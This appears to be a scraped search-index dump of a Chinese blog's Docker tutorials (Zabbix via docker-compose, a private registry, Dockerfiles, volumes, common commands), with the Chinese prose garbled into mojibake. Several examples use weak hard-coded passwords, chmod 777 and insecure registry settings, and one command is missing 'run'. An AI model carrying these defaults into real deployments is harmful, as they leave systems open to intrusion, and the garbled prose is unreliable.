vim /opt/myzabbix/docker-compose.yaml yamlæ–‡ä»¶å†…å®¹ version: '3' services: mysql-server: image: mysql:5.7 restart: always environment: MYSQL_ROOT_PASSWORD: root_pwd MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd command: --character-set-server=utf8 zabbix-java-gateway: image: zabbix/zabbix-java-gateway:latest restart: always zabbix-server: depends_on: - mysql-server image: zabbix/zabbix-server-mysql:latest restart: always environment: DB_SERVER_HOST: mysql-server MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd MYSQL_ROOT_PASSWORD: root_pwd ZBX_JAVAGATEWAY: zabbix-java-gateway ports: - \"10051:10051\" zabbix-web-nginx-mysql: depends_on: - zabbix-server image: zabbix/zabbix-web-nginx-mysql:latest ports: - \"80:80\" restart: always environment: DB_SERVER_HOST: mysql-server MYSQL_DATABASE: zabbix MYSQL_USER: zabbix MYSQL_PASSWORD: zabbix_pwd MYSQL_ROOT_PASSWORD: root_pwd 3.è¿è¡Œ cd /opt/myzabbix #åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ docker-compose up ======================================================================= å…¶ä»–docker-composeå‘½ä»¤,éœ€è¦åœ¨docker-compose.yamlæ–‡ä»¶åŒä¸€ç›®å½•ä¸‹æ‰§è¡Œï¼š å¸¸ç”¨é€‰é¡¹å‚æ•°ï¼š -dï¼šåå°è¿è¡Œ -fï¼šæŒ‡å®šæ–‡ä»¶ï¼Œé»˜è®¤æ˜¯ docker-compose.yml -pï¼šé¡¹ç›®åç§° --verboseï¼šæ˜¾ç¤ºè¯¦ç»†è¿‡ç¨‹ä¿¡æ¯ æ›´å¤šå‚æ•°å¯ä»¥ä½¿ç”¨docker-composer -hæŸ¥çœ‹ å¸¸ç”¨å‘½ä»¤ï¼š #æ„å»ºå¹¶åå°å¯åŠ¨nignxå®¹å™¨ docker-compose up -d nginx #è®¾ç½®è¦ä¸ºæŸä¸ªæœåŠ¡è¿è¡Œçš„å®¹å™¨æ•° docker-compose scale zabbix-web-nginx-mysql=3 #ç™»å½•åˆ°æŒ‡å®šå®¹å™¨ä¸­ docker-compose exec mysql-server bashÂ #åœæ­¢é¡¹ç›®ä¸­æ‰€æœ‰å®¹å™¨ docker-compose stop #åœæ­¢é¡¹ç›®ä¸­æŒ‡å®šå®¹å™¨ docker-compose stop mysql-server] #å¼€å¯é¡¹ç›®ä¸­æ‰€æœ‰å®¹å™¨ docker-compose start #å¼€å¯é¡¹ç›®ä¸­æŒ‡å®šå®¹å™¨ docker-compose start mysql-server #é‡å¯é¡¹ç›®ä¸­æ‰€æœ‰å®¹å™¨ docker-compose restart #é‡å¯æŒ‡å®šå®¹å™¨ docker-compose restart mysql-server æš‚åœå®¹å™¨ docker-compose pause mysql-server æ¢å¤å®¹å™¨ docker-compose unpause mysql-server #åœæ­¢å¹¶åˆ é™¤æ‰€æœ‰å®¹å™¨å’Œé•œåƒ docker-compose downÂ #æ˜¾ç¤ºæ‰€æœ‰å®¹å™¨ docker-compose psÂ #ä¸ä¾èµ– å¯åŠ¨å®¹å™¨ï¼Œè¿è¡Œååˆ é™¤å®¹å™¨ docker-compose run --no-deps --rm mysql-server #æ„å»ºé•œåƒ docker-compose build mysql-server æŸ¥çœ‹æŒ‡å®šå®¹å™¨çš„æ—¥å¿—Â docker-compose logsÂ mysql-serverÂ æŸ¥çœ‹æŒ‡å®šå®¹å™¨çš„å®æ—¶æ—¥å¿— docker-compose logs -f mysql-serverÂ #æ£€æŸ¥é…ç½®æ–‡ä»¶ï¼Œæ²¡é—®é¢˜æ²¡æœ‰è¾“å‡ºï¼Œæœ‰é—®é¢˜è¾“å‡ºé”™è¯¯å†…å®¹ docker-compose configÂ -q ä»¥jsonçš„å½¢å¼è¾“å‡ºnginxçš„dockeræ—¥å¿— docker-compose events --json nginx ","date":"2019-07-17 18:12","objectID":"/post/651/:0:0","tags":["docker"],"title":"docker-composeå®‰è£…å’Œå¸¸ç”¨å‘½ä»¤å¹¶éƒ¨ç½²zabbixç¤ºä¾‹","uri":"/post/651/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"1.ç”Ÿæˆè®¤è¯æ–‡ä»¶ yum install -y httpd-tools mkdir -p /data/registry_auth/ htpasswd -Bbn test testpass \u003e\u003e /data/registry_auth/htpasswd 2.ä»å®˜æ–¹pullé•œåƒ docker pull registry 3.è¿è¡Œå®¹å™¨ â€“restart=alwaysï¼šé‡å¯dockerï¼Œè‡ªåŠ¨å¯åŠ¨å®¹å™¨ â€“name=registryï¼šè®¾ç½®å®¹å™¨åç§° -v /data/myregistry:/var/lib/registryï¼šå°†å®¹å™¨çš„/var/lib/registryç›®å½•æŒ‚è½½åˆ°æœ¬åœ°çš„/data/myregistry -v /data/registry_auth/:/auth/ï¼šè®¤è¯æ–‡ä»¶æ‰€åœ¨ç›®å½• docker run -d \\ -p5000:5000 \\ --restart=always \\ --name=registry \\ -v /data/myregistry/:/var/lib/registry \\ -v /data/registry_auth/:/auth/ \\ -e \"REGISTRY_AUTH=htpasswd\" \\ -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\ -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\ registry ä¸‹é¢æ˜¯æ— è®¤è¯çš„ docker run -d \\ -p5000:5000 \\ --restart=always \\ --name=registry \\ -v /data/myregistry/:/var/lib/registry \\ registry 4.ç™»é™†ä»“åº“ docker login 10.0.0.11:5000 5.ä¸Šä¼ é•œåƒåˆ°ç§æœ‰ä»“åº“ 1ï¼‰æ‰“æ ‡ç­¾æŒ‡å®šä»“åº“åœ°å€ docker tagÂ nginx:latest 10.0.0.11:5000/nginx:latest ä¸Šä¼ é•œåƒ docker pushÂ 10.0.0.11:5000/nginx:latest ä¸Šä¼ ä¹‹å‰éœ€è¦å…ˆåœ¨/etc/docker/daemon.jsonä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼Œæ·»åŠ å®Œåé‡å¯docker â€œinsecure-registriesâ€:[â€œ10.0.0.11:5000â€] 6.ä¸‹è½½é•œåƒ docker pull 10.0.0.11:5000/nginx:latest 7.æŸ¥çœ‹ä»“åº“ä¸­çš„é•œåƒ #osæŸ¥çœ‹é•œåƒ ls /data/myregistry/docker/registry/v2/repositories/ #osæŸ¥çœ‹æ ‡ç­¾ ls /data/myregistry/docker/registry/v2/repositories/é•œåƒåç§°/_manifests/tags/ #httpæŸ¥çœ‹é•œåƒ http://10.0.0.11:5000/v2/_catalog #httpæŸ¥çœ‹æ ‡ç­¾ http://10.0.0.11:5000/v2/é•œåƒåç§°/tags/list 8.åˆ é™¤ä»“åº“ä¸­çš„é•œåƒ 1ï¼‰åˆ é™¤nginxé•œåƒç›®å½• rm -fr /data/myregistry/docker/registry/v2/repositories/nginx/ 2ï¼‰åƒåœ¾å›æ”¶ docker exec -it registry registry garbage-collect /etc/docker/registry/config.yml ","date":"2019-07-17 13:46","objectID":"/post/642/:0:0","tags":["docker"],"title":"docker éƒ¨ç½²ç§æœ‰ä»“åº“registryè®¾ç½®è®¤è¯å’Œä¸€äº›å¸¸ç”¨ä»“åº“æ“ä½œ","uri":"/post/642/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"é€šè¿‡â€“linkå¯ä»¥å®ç°å•å‘åˆ«åè®¿é—®. 1.åœ¨docker01ä¸­åˆ›å»ºå®¹å™¨1 # åˆ›å»ºä¸€ä¸ªå®¹å™¨å‘½åä¸ºcontainer1 docker run -d --name container1 busybox tail -f # æŸ¥ä¸€ä¸‹ipæ˜¯172.17.0.2 docker inspect container1 | grep -i ipaddr 2.åœ¨docker01ä¸­åˆ›å»ºå®¹å™¨2 #å¯ä»¥å¤šæ¬¡ä½¿ç”¨ â€“link [name or id]:alias #åˆ›å»ºç¬¬äºŒå°å®¹å™¨ï¼Œé“¾æ¥å®¹å™¨1å¹¶è®¾ç½®åˆ«åc1 docker run -it --link container1:c1 busybox # pingæµ‹è¯• / # ping c1 PING c1 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.135 ms ^C --- c1 ping statistics --- 1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.135/0.135/0.135 ms / # ping container1 PING container1 (172.17.0.2): 56 data bytes 64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.118 ms 64 bytes from 172.17.0.2: seq=1 ttl=64 time=0.158 ms ^C --- container1 ping statistics --- 2 packets transmitted, 2 packets received, 0% packet loss round-trip min/avg/max = 0.118/0.138/0.158 ms ","date":"2019-07-17 10:42","objectID":"/post/635/:0:0","tags":["docker"],"title":"dockerä¸­å®¹å™¨ä¹‹é—´çš„é€šä¿¡ä¹‹--link","uri":"/post/635/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"å·¥ä½œç›®å½•ï¼š/opt/dockerfile/centos6.9_kod/ åŸºäºcentos6.9åˆ¶ä½œä¸€ä¸ªkodexplorerçš„é•œåƒ 1.åˆ›å»ºç¼–è¾‘dockerfileæ–‡ä»¶ #æ–°ç‰ˆæœ¬çš„dockerfileæ–‡ä»¶åé¦–å­—æ¯ä¸åŒºåˆ†å¤§å°å†™ï¼Œè€ç‰ˆæœ¬ä¸­æ–‡ä»¶åå¿…é¡»æ˜¯Dockerfile vim /opt/dockerfile/centos6.9_kod/dockerfile dockerfileå†…å®¹å¦‚ä¸‹ï¼š FROM centos:6.9 RUN curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo \u0026\u0026 \\ curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo \u0026\u0026 \\ yum install nginx php-fpm php-gd php-mbstring unzip -y COPY nginx.conf /etc/nginx/nginx.conf WORKDIR /data ADD kodexplorer4.40.zip /data/ RUN unzip kodexplorer4.40.zip \u0026\u0026 \\ chmod -R 777 /data/ EXPOSE 80 COPY init.sh /init.sh CMD [\"/bin/sh\",\"/init.sh\"] init.shï¼šç”¨äºå¯åŠ¨æœåŠ¡ä½¿ç”¨ #!/bin/bash service php-fpm start nginx -g \"daemon off;\" nginx.confï¼šç®€å•ä¿®æ”¹ä¸€ä¸‹phpéƒ¨åˆ† worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; location / { root /data; index index.php index.html index.htm; } location ~ \\.php$ { root /data; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data$fastcgi_script_name; include fastcgi_params; } } } æ„å»ºé•œåƒï¼š -tï¼šæ‰“ä¸€ä¸ªæ ‡ç­¾ .ï¼šå½“å‰ç›®å½•â€“\u003e/opt/dockerfile/centos6.9_kod/ docker build -t kod:v1 . åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ï¼š docker -d -p80:80 kod:v1 ","date":"2019-07-12 18:27","objectID":"/post/621/:0:0","tags":["docker"],"title":"ä½¿ç”¨dockerfileåˆ¶ä½œé•œåƒ","uri":"/post/621/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"dockerfileæŒ‡ä»¤ï¼š FROMï¼šæŒ‡å®šåŸºç¡€é•œåƒ #è¯­æ³•ç¤ºä¾‹ FROM centos FROM centos:6.9 #ä¸åŠ tagæ ‡ç­¾ï¼Œé»˜è®¤æ˜¯latest MAINTAINER:(å¯é€‰)ç»´æŠ¤è€…ä¿¡æ¯ #è¯­æ³•ç¤ºä¾‹ MAINTAINER my name is soulchild. LABLEï¼š(å¯é€‰)æ ‡ç­¾ã€æè¿°ä¿¡æ¯ï¼Œå¯ä»¥å†™æˆå¤šä¸ªLABLEï¼Œå»ºè®®åªå†™ä¸€ä¸ªï¼Œå¯ä»¥ä½¿ç”¨\\ç¬¦å· #è¯­æ³•ç¤ºä¾‹ LABEL version=\"1.1\" \\ description=\"this is example\" RUNï¼šæ„å»ºé•œåƒæ—¶æ‰§è¡Œçš„å‘½ä»¤ï¼Œæ¯ä¸€ä¸ªRUNéƒ½ä¼šç”Ÿæˆä¸€å±‚é•œåƒï¼Œå¯ä»¥ä½¿ç”¨\u0026\u0026å’Œ\\æ¥è§£å†³å¤šå±‚è‡ƒè‚¿çš„é—®é¢˜ã€‚ #è¯­æ³•ç¤ºä¾‹ RUN yum install -y openssh-server \u0026\u0026 \\ service sshd start \u0026\u0026 \\ echo '123456' | passwd root --stdin ADDï¼šå°†æ–‡ä»¶å¤åˆ¶åˆ°é•œåƒä¸­ï¼Œå¦‚æœæ–‡ä»¶æ ¼å¼æ˜¯taråŒ…ï¼Œä¼šè‡ªåŠ¨è§£å‹ï¼Œè¿˜å¯ä»¥è®¿é—®ç½‘ç»œèµ„æº #è¯­æ³•ç¤ºä¾‹ ADD /root/test.tar.gz /opt/ ADD http://xxx.xxx.com/download/xx.zip /opt COPYï¼šå°†æ–‡ä»¶å¤åˆ¶åˆ°é•œåƒä¸­ #è¯­æ³•ç¤ºä¾‹ COPY /root/kod.confÂ /etc/nginx/conf.d/kod.conf ENVï¼šè®¾ç½®ç¯å¢ƒå˜é‡ #è¯­æ³•ç¤ºä¾‹ #1.ä¸€æ¬¡åªèƒ½è®¾ç½®ä¸€ä¸ª ENV a 123 #2.ä¸€æ¬¡å¯ä»¥è®¾ç½®å¤šä¸ªï¼Œæ”¯æŒ\\æ¢è¡Œ ENV b=456 c=789 #è¿è¡Œå®¹å™¨æ—¶éœ€è¦æŒ‡å®š-eå‚æ•° WORKDIRï¼šåˆ‡æ¢å·¥ä½œç›®å½•ï¼Œç›¸å½“äºcd #è¯­æ³•ç¤ºä¾‹ WORKDIR /opt EXPOSEï¼šç«¯å£æ˜ å°„ #è¯­æ³•ç¤ºä¾‹ EXPOSE 80 443 EXPOSE 22/tcp 23/udp #éœ€è¦åœ¨å®¹å™¨è¿è¡Œæ—¶æŒ‡å®š-På‚æ•°ï¼Œæ‰ä¼šå°†å®¿ä¸»æœºéšæœºç«¯å£æ˜ å°„åˆ°å®¹å™¨å‘å¸ƒçš„ç«¯å£ VOLUMEï¼šè®¾ç½®å·ï¼ŒæŒ‚è½½ç›®å½• #è¯­æ³•ç¤ºä¾‹ VOLUME /usr/share/nginx/html #å¯åŠ¨å®¹å™¨æ—¶ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå·ï¼Œå¯ä»¥é€šè¿‡docker volume [command],æŸ¥çœ‹å·çš„è¯¦ç»†ä¿¡æ¯ CMDï¼šå®¹å™¨å¯åŠ¨åçš„åˆå§‹å‘½ä»¤ï¼Œæ­¤å‚æ•°åªèƒ½å‡ºç°ä¸€æ¬¡ã€‚å¦‚æœåœ¨è¿è¡Œå®¹å™¨æ—¶æŒ‡å®šè¿è¡Œå‘½ä»¤äº†ï¼Œæ­¤å‚æ•°æ— æ•ˆï¼Œä¼šè¢«æ›¿æ¢æ‰ã€‚ #æ ¼å¼ï¼š CMD [\"å‘½ä»¤\",\"å‚æ•°1\",\"å‚æ•°2\"] #è¯­æ³•ç¤ºä¾‹ CMD [\"/usr/sbin/sshd\",\"-D\"] ENTRYPOINTï¼šå¯åŠ¨å®¹å™¨æ—¶å¦‚æœæ‰‹åŠ¨æŒ‡å®šäº†ä¸€ä¸ªå‘½ä»¤ï¼Œä¼šè¢«è¿½åŠ åˆ°æœ€åå½“ä½œå‚æ•°è€Œæ‰§è¡Œï¼Œ #æ ¼å¼ï¼š ENTRYPOINT [\"å‘½ä»¤\",\"å‚æ•°1\",\"å‚æ•°2\"] #è¯­æ³•ç¤ºä¾‹ ENTRYPOINT [\"/bin/bash\",\"init.sh\"] #å®¹å™¨è¿è¡Œ docker run -d entrypoint:test hello å®é™…ä¸Šè¿è¡Œçš„åˆå§‹å‘½ä»¤æ˜¯/bin/bash init.sh hello ","date":"2019-07-12 16:38","objectID":"/post/617/:0:0","tags":["docker"],"title":"dockerfileæŒ‡ä»¤è¯¦è§£","uri":"/post/617/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"1.é¦–å…ˆé€‰æ‹©åº•å±‚é•œåƒcentos6.9 docker pull centos:6.9 2.è¿è¡Œå®¹å™¨ docker run -it -p80:80 --name kodexplorer centos:6.9 3.è¿›å…¥å®¹å™¨ç³»ç»Ÿåçš„æ“ä½œ #å®‰è£…lnmp curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-6.repo curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo yum install nginx php-fpm php-gd php-mbstring wget unzip -y cd /usr/share/nginx/html rm -f /usr/share/nginx/html/* wget http://static.kodcloud.com/update/download/kodexplorer4.40.zip rm -f kodexplorer4.40.zip #ä¿®æ”¹nginxé…ç½®æ–‡ä»¶ï¼Œå¯å‚è€ƒä¸‹é¢çš„é…ç½® vi /etc/nginx/conf.d/default.conf #ä¿®æ”¹æƒé™ chmod -R 777 /usr/share/nginx/html/ #åˆ›å»ºæœåŠ¡å¯åŠ¨è„šæœ¬ mkdir /server/ vim /server/init.sh setenforce 0 service php-fpm start nginx -g 'daemon off;' #åˆ é™¤æ— ç”¨è½¯ä»¶,ç¼©å‡é•œåƒå¤§å° yum remove unzip wget -y yum clean all é€€å‡ºå®¹å™¨ã€‚ nginxé…ç½®æ–‡ä»¶ï¼š server { listen 80 default_server; listen [::]:80 default_server; server_name _; root /usr/share/nginx/html; index index.php # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / { } location ~ \\.php$ { root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } error_page 404 /404.html; location = /40x.html { } error_page 500 502 503 504 /50x.html; location = /50x.html { } } 4.æäº¤é•œåƒ æŒ‡å®šå®¹å™¨IDæˆ–åå­—ï¼škodexplorer ç»™ç”Ÿæˆçš„é•œåƒåå­—æ‰“æ ‡ç­¾ï¼škodexplorer:v1 docker commit kodexplorer kodexplorer:v1 5.æµ‹è¯• docker run -d -p80:80 kodexplorer:v1 sh /server/init.sh ","date":"2019-07-11 17:49","objectID":"/post/613/:0:0","tags":["docker"],"title":"dcoker æ‰‹åŠ¨åˆ¶ä½œkodexploreré•œåƒ","uri":"/post/613/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"æŸ¥çœ‹å½“å‰å· docker volume ls åˆ›å»ºä¸€ä¸ªå· docker volume create web_data åˆ é™¤ä¸€ä¸ªå· docker volume rm web_data æŸ¥çœ‹è¿™ä¸ªå·çš„è¯¦ç»†ä¿¡æ¯ docker volume inspect web_data å‘½ä»¤è¡Œå‚æ•° -v å®¿ä¸»æœºç›®å½•æˆ–å·åç§°:å®¹å™¨ç›®å½• ç¤ºä¾‹ docker run -d -p80:80 -v web_data:/usr/share/nginx/html nginx æ³¨æ„ï¼š -vå‚æ•°ä½¿ç”¨çš„æ˜¯å·åæ—¶ï¼š å½“web_dataçš„æŒ‚è½½ç‚¹ä¸­æ²¡æœ‰æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨å°†å®¹å™¨ç›®å½•ä¸­çš„å†…å®¹åŒæ­¥åˆ°web_dataçš„æŒ‚è½½ç‚¹ã€‚ å½“web_dataçš„æŒ‚è½½ç‚¹ä¸­æœ‰æ–‡ä»¶æ—¶ï¼Œä¼šè‡ªåŠ¨å°†web_dataçš„æŒ‚è½½ç‚¹çš„å†…å®¹åŒæ­¥åˆ°å®¹å™¨ç›®å½•ä¸­ã€‚ -vå‚æ•°ä½¿ç”¨çš„æ˜¯ç›®å½•æ—¶ï¼š å®¹å™¨å†…çš„å†…å®¹ä¼šè¢«æ¸…ç©º ","date":"2019-07-11 16:05","objectID":"/post/611/:0:0","tags":["docker"],"title":"docker volumeæŒ‚è½½æ•°æ®å·,å®ç°æ•°æ®æŒä¹…åŒ–","uri":"/post/611/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"æŸ¥è¯¢é•œåƒ docker search nginx ","date":"2019-07-11 15:50","objectID":"/post/602/:0:1","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"æ‹‰å–é•œåƒ docker pull nginx:1.17.1 ","date":"2019-07-11 15:50","objectID":"/post/602/:0:2","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"æŸ¥è¯¢æœ¬åœ°é•œåƒ #æŸ¥è¯¢æ‰€æœ‰é•œåƒ docker imagesÂ #æŸ¥è¯¢æ‰€æœ‰é•œåƒï¼ŒåŒ…å«ä¸­é—´å±‚ docker images -a #æŸ¥è¯¢æŒ‡å®šé•œåƒ docker images nginx ","date":"2019-07-11 15:50","objectID":"/post/602/:0:3","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"åˆ é™¤é•œåƒ docker image rm nginx:1.17.1 ","date":"2019-07-11 15:50","objectID":"/post/602/:0:4","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"å¯¼å…¥ã€å¯¼å‡º(é€šè¿‡loadã€save) #å¯¼å…¥é•œåƒ,-i:æŒ‡å®šé•œåƒæ–‡ä»¶ docker image load -i docker_nginx1.17.1.tar.gz #å¯¼å‡ºé•œåƒ,-o:è¾“å‡ºçš„æ–‡ä»¶åç§°è·¯å¾„ docker image save -o docker_nginx1.17.1.tar.gz nginx:1.17.1 #å¯¼å‡ºé•œåƒ,é‡å®šå‘æ–¹å¼ docker image save nginx:1.17.1 \u003e docker_nginx1.17.1.tar.gz ","date":"2019-07-11 15:50","objectID":"/post/602/:0:5","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"å¯¼å…¥ã€å¯¼å‡º(é€šè¿‡exportã€import) å’Œä¸Šé¢çš„ç±»ä¼¼ï¼Œä½†æ˜¯é€šè¿‡exportå¯ä»¥ç›´æ¥å¯¼å‡ºå®¹å™¨ï¼Œä½†éœ€è¦ä½¿ç”¨importå¯¼å…¥ #å¯¼å…¥é•œåƒ,-i:æŒ‡å®šé•œåƒæ–‡ä»¶ docker import docker_nginx1.17.1.tar.gz nginx:1.17.1 #å¯¼å‡ºå®¹å™¨ä¸ºé•œåƒ,-o:è¾“å‡ºçš„æ–‡ä»¶åç§°è·¯å¾„ docker export -o docker_nginx.tar.gz å®¹å™¨ID ","date":"2019-07-11 15:50","objectID":"/post/602/:0:6","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ -i : ä¿æŒæ‰“å¼€stdin -t : åˆ†é…ä¸€ä¸ªTTYç»ˆç«¯ é€šå¸¸-itä¸€èµ·ä½¿ç”¨ -d : åå°è¿è¡Œï¼Œå¹¶æ˜¾ç¤ºå®¹å™¨ID -p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£ -p IP:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£(åˆ†é…ä¸€ä¸ªIPåšæ˜ å°„ ) -p IP::å®¹å™¨ç«¯å£(éšæœºç«¯å£) -p ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£:udp -pÂ IP::53:udpï¼ˆåˆ†é…ä¸€ä¸ªIPï¼Œéšæœºçš„ç«¯å£æ˜ å°„åˆ°å®¹å™¨53ç«¯å£ï¼Œä½¿ç”¨udpï¼‰ -p 81:80 â€“p 443:443 å¯ä»¥æŒ‡å®šå¤šä¸ª-p -Pï¼šéšæœºç«¯å£æ˜ å°„ï¼Œå¯ä»¥å’Œdockerfileä¸­çš„EXPOSEé…åˆä½¿ç”¨ â€“nameï¼šæŒ‡å®šå®¹å™¨åç§° -hï¼šæŒ‡å®šå®¹å™¨ä¸»æœºå -vï¼šå°†æœ¬åœ°ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­,å®ç°æ•°æ®æŒä¹…åŒ– docker runÂ -d -p80:80 --name web -v /opt/www:/usr/share/nginx/html nginx:latest ","date":"2019-07-11 15:50","objectID":"/post/602/:0:7","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"æŸ¥çœ‹å®¹å™¨ -aï¼šæŸ¥çœ‹æ‰€æœ‰å®¹å™¨ï¼Œé»˜è®¤ä¸æ˜¾ç¤ºå·²é€€å‡ºçš„å®¹å™¨ -qï¼šåªæ˜¾ç¤ºå®¹å™¨ID -lï¼šæŸ¥çœ‹æœ€è¿‘ä¸€æ¬¡åˆ›å»ºçš„å®¹å™¨ â€“no-truncï¼šæ˜¾ç¤ºå®Œæ•´ä¿¡æ¯ docker ps -a ","date":"2019-07-11 15:50","objectID":"/post/602/:0:8","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"è¿›å…¥å®¹å™¨ #ç‹¬ç«‹ç»ˆç«¯è¿æ¥å®¹å™¨ docker exec -it å®¹å™¨IDæˆ–åå­— /bin/bash #éœ€è¦å·²ç»è¿è¡Œbashç¯å¢ƒï¼Œä½¿ç”¨åŒä¸€ä¸ªç»ˆç«¯ï¼Œç»ˆç«¯çš„å†…å®¹ä¼šåŒæ­¥è¿›è¡Œã€‚å¯ä»¥é€šè¿‡ctrl + pï¼Œctrl + qé€€å‡ºã€‚ docker attach å®¹å™¨IDæˆ–åå­— åˆ é™¤å®¹å™¨ docker rm å®¹å™¨IDæˆ–åå­— æ‰¹é‡åˆ é™¤å®¹å™¨ -f:å¼ºåˆ¶åˆ é™¤ docker rm $(docker ps -a -q) å®¿ä¸»æœºå’Œå®¹å™¨ä¹‹é—´çš„æ–‡ä»¶å¤åˆ¶ docker cp nostalgic_goldberg:/etc/nginx/conf.d/default.conf /opt/ ","date":"2019-07-11 15:50","objectID":"/post/602/:0:9","tags":["docker"],"title":"dockerå¸¸ç”¨å‘½ä»¤å’Œå‚æ•°è¯´æ˜","uri":"/post/602/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ç½‘ç»œé…ç½®çš„ä¸¤ç§æ–¹å¼ å›¾å½¢ç•Œé¢æ–¹å†…å¼(network-manager)å’Œä¿®æ”¹/etc/network/interfaces ä½†æ˜¯å¦‚æœä¸¤å®¹ç§æ–¹å¼çš„ç½‘ç»œè®¾ç½®ä¸åŒï¼Œå°±ä¼šäº§ç”Ÿå†²çªï¼Œå³ï¼šnetwork-managerä¸/etc/network/interfacesæ–‡ä»¶å†²çª,å°±ä¼šå¯¼è‡´è¯†åˆ«ä¸äº†IPã€‚ ","date":"2019-07-09 16:49","objectID":"/post/1931/:0:0","tags":[],"title":"network-managerä¸interfacesä¸ºä»€ä¹ˆä¼šå†²çª","uri":"/post/1931/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"ä¸­ç§‘å¤§ï¼šhttps://docker.mirrors.ustc.edu.cn ç½‘æ˜“ï¼šhttp://hub-mirror.c.163.com å®˜æ–¹ï¼šhttps://registry.docker-cn.com 1.æ–°ç‰ˆæœ¬ï¼š vim /etc/docker/daemon.json { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn\"] } 2.è€ç‰ˆæœ¬ï¼šæ¯ä¸ªé…ç½®é¡¹ç”¨ç©ºæ ¼åˆ†å¼€ vim /etc/sysconfig/docker DOCKER_OPTS=\"--registry-mirror=https://docker.mirrors.ustc.edu.cn\" 3é…ç½®ä»“åº“ä¿¡ä»» æ–°ç‰ˆï¼šæ¯ä¸ªé…ç½®é¡¹ç”¨é€—å·åˆ†å¼€ vim /etc/docker/daemon.json { \"insecure-registries\":[\"192.168.1.90\"] } è€ç‰ˆï¼šæ¯ä¸ªé…ç½®é¡¹ç”¨ç©ºæ ¼åˆ†å¼€ vim /etc/sysconfig/docker DOCKER_OPTS=\"--insecure-registries 192.168.1.90\" 4.é‡å¯dockeræœåŠ¡ systemctl reload docker ","date":"2019-07-09 16:10","objectID":"/post/604/:0:0","tags":["docker"],"title":"dockeré…ç½®å›½å†…é•œåƒåŠ é€Ÿå’Œä¿¡ä»»ä»“åº“","uri":"/post/604/"},{"categories":["è™šæ‹ŸåŒ–","docker"],"content":"docker-ce: dockerç¤¾åŒºç‰ˆ docker-ee: dockerä¼ä¸šç‰ˆ 1.é…ç½®docker-ceÂ yumæº curl -o /etc/yum.repos.d/docker-ce.repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 2.å®‰è£…docker-ce yum install -y docker-ce 3.è®¾ç½®å¼€æœºè‡ªå¯å¹¶å¯åŠ¨docker systemctl enable docker systemctl start docker","date":"2019-07-09 11:14","objectID":"/post/597/:0:0","tags":["docker"],"title":"yumå®‰è£…docker","uri":"/post/597/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"ä¸»è¦å‚æ•°ï¼š net.ifnames=0 biosdevname=0 1.ä¿®æ”¹ç½‘å¡åç§° vim /etc/sysconfig/network-scripts/ifcfg-ens33 